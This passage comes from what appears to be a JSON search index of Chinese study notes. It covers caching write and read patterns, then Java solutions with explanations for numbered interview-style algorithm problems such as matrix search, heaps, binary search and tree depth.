简单画了一张图帮助大家理解写的步骤。\n读(Read Through)：\n 从 cache 中读取数据，读取到就直接返回 。 读取不到的话，先从 DB 加载，写入到 cache 后返回响应。  简单画了一张图帮助大家理解读的步骤。\nRead-Through Pattern 实际只是在 Cache-Aside Pattern 之上进行了封装。在 Cache-Aside Pattern 下，发生读请求的时候，如果 cache 中不存在对应的数据，是由客户端自己负责把数据写入 cache，而 Read Through Pattern 则是 cache 服务自己来写入缓存的，这对客户端是透明的。\n和 Cache Aside Pattern 一样， Read-Through Pattern 也有首次请求数据一定不再 cache 的问题，对于热点数据可以提前放入缓存中。\nWrite Behind Pattern（异步缓存写入）    Write Behind Pattern 和 Read/Write Through Pattern 很相似，两者都是由 cache 服务来负责 cache 和 DB 的读写。\n但是，两个又有很大的不同：Read/Write Through 是同步更新 cache 和 DB，而 Write Behind Caching 则是只更新缓存，不直接更新 DB，而是改为异步批量的方式来更新 DB。\n很明显，这种方式对数据一致性带来了更大的挑战，比如cache数据可能还没异步更新DB的话，cache服务可能就就挂掉了。\n这种策略在我们平时开发过程中也非常非常少见，但是不代表它的应用场景少，比如消息队列中消息的异步写入磁盘、MySQL 的 InnoDB Buffer Pool 机制都用到了这种策略。\nWrite Behind Pattern 下 DB 的写性能非常高，非常适合一些数据经常变化又对数据一致性要求没那么高的场景，比如浏览量、点赞量。\n"},{"id":89,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/4.4.-%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/","title":"4. 二维数组中的查找","parent":"数据结构","content":"4. 二维数组中的查找    题目链接    牛客网\n题目描述    给定一个二维数组，其每一行从左到右递增排序，从上到下也是递增排序。给定一个数，判断这个数是否在该二维数组中。\nConsider the following matrix: [ [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30] ] Given target = 5, return true. Given target = 20, return false. 解题思路    要求时间复杂度 O(M + N)，空间复杂度 O(1)。其中 M 为行数，N 为 列数。\n该二维数组中的一个数，小于它的数一定在其左边，大于它的数一定在其下边。因此，从右上角开始查找，就可以根据 target 和当前元素的大小关系来快速地缩小查找区间，每次减少一行或者一列的元素。当前元素的查找区间为左下角的所有元素。\n\npublic boolean Find(int target, int[][] matrix) { if (matrix == null || matrix.length == 0 || matrix[0].length == 0) return false; int rows = matrix.length, cols = matrix[0].length; int r = 0, c = cols - 1; // 从右上角开始  while (r \u0026lt;= rows - 1 \u0026amp;\u0026amp; c \u0026gt;= 0) { if (target == matrix[r][c]) return true; else if (target \u0026gt; matrix[r][c]) r++; else c--; } return false; } "},{"id":90,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/40.40.-%E6%9C%80%E5%B0%8F%E7%9A%84-K-%E4%B8%AA%E6%95%B0/","title":"40. 最小的 K 个数","parent":"数据结构","content":"40. 最小的 K 个数    题目链接    牛客网\n解题思路    大小为 K 的最小堆     复杂度：O(NlogK) + O(K) 特别适合处理海量数据  维护一个大小为 K 的最小堆过程如下：使用大顶堆。在添加一个元素之后，如果大顶堆的大小大于 K，那么将大顶堆的堆顶元素去除，也就是将当前堆中值最大的元素去除，从而使得留在堆中的元素都比被去除的元素来得小。\n应该使用大顶堆来维护最小堆，而不能直接创建一个小顶堆并设置一个大小，企图让小顶堆中的元素都是最小元素。\nJava 的 PriorityQueue 实现了堆的能力，PriorityQueue 默认是小顶堆，可以在在初始化时使用 Lambda 表达式 (o1, o2) -\u0026gt; o2 - o1 来实现大顶堆。其它语言也有类似的堆数据结构。\npublic ArrayList\u0026lt;Integer\u0026gt; GetLeastNumbers_Solution(int[] nums, int k) { if (k \u0026gt; nums.length || k \u0026lt;= 0) return new ArrayList\u0026lt;\u0026gt;(); PriorityQueue\u0026lt;Integer\u0026gt; maxHeap = new PriorityQueue\u0026lt;\u0026gt;((o1, o2) -\u0026gt; o2 - o1); for (int num : nums) { maxHeap.add(num); if (maxHeap.size() \u0026gt; k) maxHeap.poll(); } return new ArrayList\u0026lt;\u0026gt;(maxHeap); } 快速选择     复杂度：O(N) + O(1) 只有当允许修改数组元素时才可以使用  快速排序的 partition() 方法，会返回一个整数 j 使得 a[l..j-1] 小于等于 a[j]，且 a[j+1..h] 大于等于 a[j]，此时 a[j] 就是数组的第 j 大元素。可以利用这个特性找出数组的第 K 个元素，这种找第 K 个元素的算法称为快速选择算法。\npublic ArrayList\u0026lt;Integer\u0026gt; GetLeastNumbers_Solution(int[] nums, int k) { ArrayList\u0026lt;Integer\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); if (k \u0026gt; nums.length || k \u0026lt;= 0) return ret; findKthSmallest(nums, k - 1); /* findKthSmallest 会改变数组，使得前 k 个数都是最小的 k 个数 */ for (int i = 0; i \u0026lt; k; i++) ret.add(nums[i]); return ret; } public void findKthSmallest(int[] nums, int k) { int l = 0, h = nums.length - 1; while (l \u0026lt; h) { int j = partition(nums, l, h); if (j == k) break; if (j \u0026gt; k) h = j - 1; else l = j + 1; } } private int partition(int[] nums, int l, int h) { int p = nums[l]; /* 切分元素 */ int i = l, j = h + 1; while (true) { while (i != h \u0026amp;\u0026amp; nums[++i] \u0026lt; p) ; while (j != l \u0026amp;\u0026amp; nums[--j] \u0026gt; p) ; if (i \u0026gt;= j) break; swap(nums, i, j); } swap(nums, l, j); return j; } private void swap(int[] nums, int i, int j) { int t = nums[i]; nums[i] = nums[j]; nums[j] = t; } "},{"id":91,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/41.141.1-%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/","title":"41.1 数据流中的中位数","parent":"数据结构","content":"41.1 数据流中的中位数    题目链接    牛客网\n题目描述    如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。\n解题思路    /* 大顶堆，存储左半边元素 */ private PriorityQueue\u0026lt;Integer\u0026gt; left = new PriorityQueue\u0026lt;\u0026gt;((o1, o2) -\u0026gt; o2 - o1); /* 小顶堆，存储右半边元素，并且右半边元素都大于左半边 */ private PriorityQueue\u0026lt;Integer\u0026gt; right = new PriorityQueue\u0026lt;\u0026gt;(); /* 当前数据流读入的元素个数 */ private int N = 0; public void Insert(Integer val) { /* 插入要保证两个堆存于平衡状态 */ if (N % 2 == 0) { /* N 为偶数的情况下插入到右半边。 * 因为右半边元素都要大于左半边，但是新插入的元素不一定比左半边元素来的大， * 因此需要先将元素插入左半边，然后利用左半边为大顶堆的特点，取出堆顶元素即为最大元素，此时插入右半边 */ left.add(val); right.add(left.poll()); } else { right.add(val); left.add(right.poll()); } N++; } public Double GetMedian() { if (N % 2 == 0) return (left.peek() + right.peek()) / 2.0; else return (double) right.peek(); } "},{"id":92,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/41.241.2-%E5%AD%97%E7%AC%A6%E6%B5%81%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%97%E7%AC%A6/","title":"41.2 字符流中第一个不重复的字符","parent":"数据结构","content":"41.2 字符流中第一个不重复的字符    题目描述    牛客网\n题目描述    请实现一个函数用来找出字符流中第一个只出现一次的字符。例如，当从字符流中只读出前两个字符 \u0026ldquo;go\u0026rdquo; 时，第一个只出现一次的字符是 \u0026ldquo;g\u0026rdquo;。当从该字符流中读出前六个字符“google\u0026quot; 时，第一个只出现一次的字符是 \u0026ldquo;l\u0026rdquo;。\n解题思路    使用统计数组来统计每个字符出现的次数，本题涉及到的字符为都为 ASCII 码，因此使用一个大小为 128 的整型数组就能完成次数统计任务。\n使用队列来存储到达的字符，并在每次有新的字符从字符流到达时移除队列头部那些出现次数不再是一次的元素。因为队列是先进先出顺序，因此队列头部的元素为第一次只出现一次的字符。\nprivate int[] cnts = new int[128]; private Queue\u0026lt;Character\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); public void Insert(char ch) { cnts[ch]++; queue.add(ch); while (!queue.isEmpty() \u0026amp;\u0026amp; cnts[queue.peek()] \u0026gt; 1) queue.poll(); } public char FirstAppearingOnce() { return queue.isEmpty() ? \u0026#39;#\u0026#39; : queue.peek(); } "},{"id":93,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/42.42.-%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%A4%A7%E5%92%8C/","title":"42. 连续子数组的最大和","parent":"数据结构","content":"42. 连续子数组的最大和    NowCoder\n题目描述    {6, -3, -2, 7, -15, 1, 2, 2}，连续子数组的最大和为 8（从第 0 个开始，到第 3 个为止）。\n解题思路    public int FindGreatestSumOfSubArray(int[] nums) { if (nums == null || nums.length == 0) return 0; int greatestSum = Integer.MIN_VALUE; int sum = 0; for (int val : nums) { sum = sum \u0026lt;= 0 ? val : sum + val; greatestSum = Math.max(greatestSum, sum); } return greatestSum; } "},{"id":94,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/43.43.-%E4%BB%8E-1-%E5%88%B0-n-%E6%95%B4%E6%95%B0%E4%B8%AD-1-%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0/","title":"43. 从 1 到 n 整数中 1 出现的次数","parent":"数据结构","content":"43. 从 1 到 n 整数中 1 出现的次数    NowCoder\n解题思路    public int NumberOf1Between1AndN_Solution(int n) { int cnt = 0; for (int m = 1; m \u0026lt;= n; m *= 10) { int a = n / m, b = n % m; cnt += (a + 8) / 10 * m + (a % 10 == 1 ? b + 1 : 0); } return cnt; }  Leetcode : 233. Number of Digit One\n "},{"id":95,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/44.44.-%E6%95%B0%E5%AD%97%E5%BA%8F%E5%88%97%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%80%E4%BD%8D%E6%95%B0%E5%AD%97/","title":"44. 数字序列中的某一位数字","parent":"数据结构","content":"44. 数字序列中的某一位数字    题目描述    数字以 0123456789101112131415\u0026hellip; 的格式序列化到一个字符串中，求这个字符串的第 index 位。\n解题思路    public int getDigitAtIndex(int index) { if (index \u0026lt; 0) return -1; int place = 1; // 1 表示个位，2 表示 十位...  while (true) { int amount = getAmountOfPlace(place); int totalAmount = amount * place; if (index \u0026lt; totalAmount) return getDigitAtIndex(index, place); index -= totalAmount; place++; } } /** * place 位数的数字组成的字符串长度 * 10, 90, 900, ... */ private int getAmountOfPlace(int place) { if (place == 1) return 10; return (int) Math.pow(10, place - 1) * 9; } /** * place 位数的起始数字 * 0, 10, 100, ... */ private int getBeginNumberOfPlace(int place) { if (place == 1) return 0; return (int) Math.pow(10, place - 1); } /** * 在 place 位数组成的字符串中，第 index 个数 */ private int getDigitAtIndex(int index, int place) { int beginNumber = getBeginNumberOfPlace(place); int shiftNumber = index / place; String number = (beginNumber + shiftNumber) + \u0026#34;\u0026#34;; int count = index % place; return number.charAt(count) - \u0026#39;0\u0026#39;; } "},{"id":96,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/45.45.-%E6%8A%8A%E6%95%B0%E7%BB%84%E6%8E%92%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0/","title":"45. 把数组排成最小的数","parent":"数据结构","content":"45. 把数组排成最小的数    题目链接    牛客网\n题目描述    输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。例如输入数组 {3，32，321}，则打印出这三个数字能排成的最小数字为 321323。\n解题思路    可以看成是一个排序问题，在比较两个字符串 S1 和 S2 的大小时，应该比较的是 S1+S2 和 S2+S1 的大小，如果 S1+S2 \u0026lt; S2+S1，那么应该把 S1 排在前面，否则应该把 S2 排在前面。\npublic String PrintMinNumber(int[] numbers) { if (numbers == null || numbers.length == 0) return \u0026#34;\u0026#34;; int n = numbers.length; String[] nums = new String[n]; for (int i = 0; i \u0026lt; n; i++) nums[i] = numbers[i] + \u0026#34;\u0026#34;; Arrays.sort(nums, (s1, s2) -\u0026gt; (s1 + s2).compareTo(s2 + s1)); String ret = \u0026#34;\u0026#34;; for (String str : nums) ret += str; return ret; } "},{"id":97,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/46.46.-%E6%8A%8A%E6%95%B0%E5%AD%97%E7%BF%BB%E8%AF%91%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"46. 把数字翻译成字符串","parent":"数据结构","content":"46. 把数字翻译成字符串    Leetcode\n题目描述    给定一个数字，按照如下规则翻译成字符串：1 翻译成“a”，2 翻译成“b”\u0026hellip; 26 翻译成“z”。一个数字有多种翻译可能，例如 12258 一共有 5 种，分别是 abbeh，lbeh，aveh，abyh，lyh。实现一个函数，用来计算一个数字有多少种不同的翻译方法。\n解题思路    public int numDecodings(String s) { if (s == null || s.length() == 0) return 0; int n = s.length(); int[] dp = new int[n + 1]; dp[0] = 1; dp[1] = s.charAt(0) == \u0026#39;0\u0026#39; ? 0 : 1; for (int i = 2; i \u0026lt;= n; i++) { int one = Integer.valueOf(s.substring(i - 1, i)); if (one != 0) dp[i] += dp[i - 1]; if (s.charAt(i - 2) == \u0026#39;0\u0026#39;) continue; int two = Integer.valueOf(s.substring(i - 2, i)); if (two \u0026lt;= 26) dp[i] += dp[i - 2]; } return dp[n]; } "},{"id":98,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/47.47.-%E7%A4%BC%E7%89%A9%E7%9A%84%E6%9C%80%E5%A4%A7%E4%BB%B7%E5%80%BC/","title":"47. 礼物的最大价值","parent":"数据结构","content":"47. 礼物的最大价值    NowCoder\n题目描述    在一个 m*n 的棋盘的每一个格都放有一个礼物，每个礼物都有一定价值（大于 0）。从左上角开始拿礼物，每次向右或向下移动一格，直到右下角结束。给定一个棋盘，求拿到礼物的最大价值。例如，对于如下棋盘\n1 10 3 8 12 2 9 6 5 7 4 11 3 7 16 5 礼物的最大价值为 1+12+5+7+7+16+5=53。\n解题思路    应该用动态规划求解，而不是深度优先搜索，深度优先搜索过于复杂，不是最优解。\npublic int getMost(int[][] values) { if (values == null || values.length == 0 || values[0].length == 0) return 0; int n = values[0].length; int[] dp = new int[n]; for (int[] value : values) { dp[0] += value[0]; for (int i = 1; i \u0026lt; n; i++) dp[i] = Math.max(dp[i], dp[i - 1]) + value[i]; } return dp[n - 1]; } "},{"id":99,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/48.48.-%E6%9C%80%E9%95%BF%E4%B8%8D%E5%90%AB%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"48. 最长不含重复字符的子字符串","parent":"数据结构","content":"48. 最长不含重复字符的子字符串    题目描述    输入一个字符串（只包含 a~z 的字符），求其最长不含重复字符的子字符串的长度。例如对于 arabcacfr，最长不含重复字符的子字符串为 acfr，长度为 4。\n解题思路    public int longestSubStringWithoutDuplication(String str) { int curLen = 0; int maxLen = 0; int[] preIndexs = new int[26]; Arrays.fill(preIndexs, -1); for (int curI = 0; curI \u0026lt; str.length(); curI++) { int c = str.charAt(curI) - \u0026#39;a\u0026#39;; int preI = preIndexs[c]; if (preI == -1 || curI - preI \u0026gt; curLen) { curLen++; } else { maxLen = Math.max(maxLen, curLen); curLen = curI - preI; } preIndexs[c] = curI; } maxLen = Math.max(maxLen, curLen); return maxLen; } "},{"id":100,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/49.49.-%E4%B8%91%E6%95%B0/","title":"49. 丑数","parent":"数据结构","content":"49. 丑数    NowCoder\n题目描述    把只包含因子 2、3 和 5 的数称作丑数（Ugly Number）。例如 6、8 都是丑数，但 14 不是，因为它包含因子 7。习惯上我们把 1 当做是第一个丑数。求按从小到大的顺序的第 N 个丑数。\n解题思路    public int GetUglyNumber_Solution(int N) { if (N \u0026lt;= 6) return N; int i2 = 0, i3 = 0, i5 = 0; int[] dp = new int[N]; dp[0] = 1; for (int i = 1; i \u0026lt; N; i++) { int next2 = dp[i2] * 2, next3 = dp[i3] * 3, next5 = dp[i5] * 5; dp[i] = Math.min(next2, Math.min(next3, next5)); if (dp[i] == next2) i2++; if (dp[i] == next3) i3++; if (dp[i] == next5) i5++; } return dp[N - 1]; } "},{"id":101,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/5.5.-%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/","title":"5. 替换空格","parent":"数据结构","content":"5. 替换空格    题目链接    牛客网\n题目描述    将一个字符串中的空格替换成 \u0026ldquo;%20\u0026rdquo;。\nInput: \u0026#34;A B\u0026#34; Output: \u0026#34;A%20B\u0026#34; 解题思路    ① 在字符串尾部填充任意字符，使得字符串的长度等于替换之后的长度。因为一个空格要替换成三个字符（%20），所以当遍历到一个空格时，需要在尾部填充两个任意字符。\n② 令 P1 指向字符串原来的末尾位置，P2 指向字符串现在的末尾位置。P1 和 P2 从后向前遍历，当 P1 遍历到一个空格时，就需要令 P2 指向的位置依次填充 02%（注意是逆序的），否则就填充上 P1 指向字符的值。从后向前遍是为了在改变 P2 所指向的内容时，不会影响到 P1 遍历原来字符串的内容。\n③ 当 P2 遇到 P1 时（P2 \u0026lt;= P1），或者遍历结束（P1 \u0026lt; 0），退出。\n\npublic String replaceSpace(StringBuffer str) { int P1 = str.length() - 1; for (int i = 0; i \u0026lt;= P1; i++) if (str.charAt(i) == \u0026#39; \u0026#39;) str.append(\u0026#34; \u0026#34;); int P2 = str.length() - 1; while (P1 \u0026gt;= 0 \u0026amp;\u0026amp; P2 \u0026gt; P1) { char c = str.charAt(P1--); if (c == \u0026#39; \u0026#39;) { str.setCharAt(P2--, \u0026#39;0\u0026#39;); str.setCharAt(P2--, \u0026#39;2\u0026#39;); str.setCharAt(P2--, \u0026#39;%\u0026#39;); } else { str.setCharAt(P2--, c); } } return str.toString(); } "},{"id":102,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/50.50.-%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E5%AD%97%E7%AC%A6%E4%BD%8D%E7%BD%AE/","title":"50. 第一个只出现一次的字符位置","parent":"数据结构","content":"50. 第一个只出现一次的字符位置    题目链接    牛客网\n题目描述    在一个字符串中找到第一个只出现一次的字符，并返回它的位置。字符串只包含 ASCII 码字符。\nInput: abacc Output: b 解题思路    最直观的解法是使用 HashMap 对出现次数进行统计：字符做为 key，出现次数作为 value，遍历字符串每次都将 key 对应的 value 加 1。最后再遍历这个 HashMap 就可以找出出现次数为 1 的字符。\n考虑到要统计的字符范围有限，也可以使用整型数组代替 HashMap。ASCII 码只有 128 个字符，因此可以使用长度为 128 的整型数组来存储每个字符出现的次数。\npublic int FirstNotRepeatingChar(String str) { int[] cnts = new int[128]; for (int i = 0; i \u0026lt; str.length(); i++) cnts[str.charAt(i)]++; for (int i = 0; i \u0026lt; str.length(); i++) if (cnts[str.charAt(i)] == 1) return i; return -1; } 以上实现的空间复杂度还不是最优的。考虑到只需要找到只出现一次的字符，那么需要统计的次数信息只有 0,1,更大，使用两个比特位就能存储这些信息。\npublic int FirstNotRepeatingChar2(String str) { BitSet bs1 = new BitSet(128); BitSet bs2 = new BitSet(128); for (char c : str.toCharArray()) { if (!bs1.get(c) \u0026amp;\u0026amp; !bs2.get(c)) bs1.set(c); // 0 0 -\u0026gt; 0 1  else if (bs1.get(c) \u0026amp;\u0026amp; !bs2.get(c)) bs2.set(c); // 0 1 -\u0026gt; 1 1  } for (int i = 0; i \u0026lt; str.length(); i++) { char c = str.charAt(i); if (bs1.get(c) \u0026amp;\u0026amp; !bs2.get(c)) // 0 1  return i; } return -1; } "},{"id":103,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/51.51.-%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%80%86%E5%BA%8F%E5%AF%B9/","title":"51. 数组中的逆序对","parent":"数据结构","content":"51. 数组中的逆序对    NowCoder\n题目描述    在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组，求出这个数组中的逆序对的总数。\n解题思路    private long cnt = 0; private int[] tmp; // 在这里声明辅助数组，而不是在 merge() 递归函数中声明  public int InversePairs(int[] nums) { tmp = new int[nums.length]; mergeSort(nums, 0, nums.length - 1); return (int) (cnt % 1000000007); } private void mergeSort(int[] nums, int l, int h) { if (h - l \u0026lt; 1) return; int m = l + (h - l) / 2; mergeSort(nums, l, m); mergeSort(nums, m + 1, h); merge(nums, l, m, h); } private void merge(int[] nums, int l, int m, int h) { int i = l, j = m + 1, k = l; while (i \u0026lt;= m || j \u0026lt;= h) { if (i \u0026gt; m) tmp[k] = nums[j++]; else if (j \u0026gt; h) tmp[k] = nums[i++]; else if (nums[i] \u0026lt;= nums[j]) tmp[k] = nums[i++]; else { tmp[k] = nums[j++]; this.cnt += m - i + 1; // nums[i] \u0026gt; nums[j]，说明 nums[i...mid] 都大于 nums[j]  } k++; } for (k = l; k \u0026lt;= h; k++) nums[k] = tmp[k]; } "},{"id":104,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/52.52.-%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%85%AC%E5%85%B1%E7%BB%93%E7%82%B9/","title":"52. 两个链表的第一个公共结点","parent":"数据结构","content":"52. 两个链表的第一个公共结点    NowCoder\n题目描述    \n解题思路    设 A 的长度为 a + c，B 的长度为 b + c，其中 c 为尾部公共部分长度，可知 a + c + b = b + c + a。\n当访问链表 A 的指针访问到链表尾部时，令它从链表 B 的头部重新开始访问链表 B；同样地，当访问链表 B 的指针访问到链表尾部时，令它从链表 A 的头部重新开始访问链表 A。这样就能控制访问 A 和 B 两个链表的指针能同时访问到交点。\npublic ListNode FindFirstCommonNode(ListNode pHead1, ListNode pHead2) { ListNode l1 = pHead1, l2 = pHead2; while (l1 != l2) { l1 = (l1 == null) ? pHead2 : l1.next; l2 = (l2 == null) ? pHead1 : l2.next; } return l1; } "},{"id":105,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/53.53.-%E6%95%B0%E5%AD%97%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0/","title":"53. 数字在排序数组中出现的次数","parent":"数据结构","content":"53. 数字在排序数组中出现的次数    题目链接    牛客网\n题目描述    Input: nums = 1, 2, 3, 3, 3, 3, 4, 6 K = 3 Output: 4 解题思路    只要能找出给定的数字 k 在有序数组第一个位置和最后一个位置，就能知道该数字出现的次数。\n先考虑如何实现寻找数字在有序数组的第一个位置。正常的二分查找如下，在查找到给定元素 k 之后，立即返回当前索引下标。\npublic int binarySearch(int[] nums, int K) { int l = 0, h = nums.length - 1; while (l \u0026lt;= h) { int m = l + (h - l) / 2; if (nums[m] == K) { return m; } else if (nums[m] \u0026gt; K) { h = m - 1; } else { l = m + 1; } } return -1; } 但是在查找第一个位置时，找到元素之后应该继续往前找。也就是当 nums[m]\u0026gt;=k 时，在左区间继续查找，左区间应该包含 m 位置。\nprivate int binarySearch(int[] nums, int K) { int l = 0, h = nums.length; while (l \u0026lt; h) { int m = l + (h - l) / 2; if (nums[m] \u0026gt;= K) h = m; else l = m + 1; } return l; } 查找最后一个位置可以转换成寻找 k+1 的第一个位置，并再往前移动一个位置。\npublic int GetNumberOfK(int[] nums, int K) { int first = binarySearch(nums, K); int last = binarySearch(nums, K + 1); return (first == nums.length || nums[first] != K) ? 0 : last - first; } 需要注意以上实现的查找第一个位置的 binarySearch 方法，h 的初始值为 nums.length，而不是 nums.length - 1。先看以下示例：\nnums = [2,2], k = 2 如果 h 的取值为 nums.length - 1，那么在查找最后一个位置时，binarySearch(nums, k + 1) - 1 = 1 - 1 = 0。这是因为 binarySearch 只会返回 [0, nums.length - 1] 范围的值，对于 binarySearch([2,2], 3) ，我们希望返回 3 插入 nums 中的位置，也就是数组最后一个位置再往后一个位置，即 nums.length。所以我们需要将 h 取值为 nums.length，从而使得 binarySearch 返回的区间更大，能够覆盖 k 大于 nums 最后一个元素的情况。\n"},{"id":106,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/54.54.-%E4%BA%8C%E5%8F%89%E6%9F%A5%E6%89%BE%E6%A0%91%E7%9A%84%E7%AC%AC-K-%E4%B8%AA%E7%BB%93%E7%82%B9/","title":"54. 二叉查找树的第 K 个结点","parent":"数据结构","content":"54. 二叉查找树的第 K 个结点    NowCoder\n解题思路    利用二叉查找树中序遍历有序的特点。\nprivate TreeNode ret; private int cnt = 0; public TreeNode KthNode(TreeNode pRoot, int k) { inOrder(pRoot, k); return ret; } private void inOrder(TreeNode root, int k) { if (root == null || cnt \u0026gt;= k) return; inOrder(root.left, k); cnt++; if (cnt == k) ret = root; inOrder(root.right, k); } "},{"id":107,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/55.155.1-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6/","title":"55.1 二叉树的深度","parent":"数据结构","content":"55.1 二叉树的深度    NowCoder\n题目描述    从根结点到叶结点依次经过的结点（含根、叶结点）形成树的一条路径，最长路径的长度为树的深度。\n\n解题思路    public int TreeDepth(TreeNode root) { return root == null ? 0 : 1 + Math.max(TreeDepth(root.left), TreeDepth(root.right)); } "},{"id":108,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/55.255.2-%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/","title":"55.2 平衡二叉树","parent":"数据结构","content":"55.2 平衡二叉树    NowCoder\n题目描述    平衡二叉树左右子树高度差不超过 1。\n\n解题思路    private boolean isBalanced = true; public boolean IsBalanced_Solution(TreeNode root) { height(root); return isBalanced; } private int height(TreeNode root) { if (root == null || !isBalanced) return 0; int left = height(root.left); int right = height(root.right); if (Math.abs(left - right) \u0026gt; 1) isBalanced = false; return 1 + Math.max(left, right); } "},{"id":109,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/56.56.-%E6%95%B0%E7%BB%84%E4%B8%AD%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/","title":"56. 数组中只出现一次的数字","parent":"数据结构","content":"56. 数组中只出现一次的数字    题目链接    牛客网\n题目描述    一个整型数组里除了两个数字之外，其他的数字都出现了两次，找出这两个数。\n解题思路    两个相等的元素异或的结果为 0，而 0 与任意数 x 异或的结果都为 x。\n对本题给的数组的所有元素执行异或操作，得到的是两个不存在重复的元素异或的结果。例如对于数组 [x,x,y,y,z,k]，x^x^y^y^z^k = 0^y^y^z^k = y^y^z^k = 0^z^k = z^k。\n两个不相等的元素在位级表示上一定会有所不同，因此这两个元素异或得到的结果 diff 一定不为 0。位运算 diff \u0026amp; -diff 能得到 diff 位级表示中最右侧为 1 的位，令 diff = diff \u0026amp; -diff。将 diff 作为区分两个元素的依据，一定有一个元素对 diff 进行异或的结果为 0，另一个结果非 0。设不相等的两个元素分别为 z 和 k，遍历数组所有元素，判断元素与 diff 的异或结果是否为 0，如果是的话将元素与 z 进行异或并赋值给 z，否则与 k 进行异或并赋值给 k。数组中相等的元素一定会同时与 z 或者与 k 进行异或操作，而不是一个与 z 进行异或，一个与 k 进行异或。而且这些相等的元素异或的结果为 0，因此最后 z 和 k 只是不相等的两个元素与 0 异或的结果，也就是不相等两个元素本身。\n下面的解法中，num1 和 num2 数组的第一个元素是用来保持返回值的\u0026hellip; 实际开发中不推荐这种返回值的方式。\npublic int[] FindNumsAppearOnce (int[] nums) { int[] res = new int[2]; int diff = 0; for (int num : nums) diff ^= num; diff \u0026amp;= -diff; for (int num : nums) { if ((num \u0026amp; diff) == 0) res[0] ^= num; else res[1] ^= num; } if (res[0] \u0026gt; res[1]) { swap(res); } return res; } private void swap(int[] nums) { int t = nums[0]; nums[0] = nums[1]; nums[1] = t; } "},{"id":110,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/57.157.1-%E5%92%8C%E4%B8%BA-S-%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%95%B0%E5%AD%97/","title":"57.1 和为 S 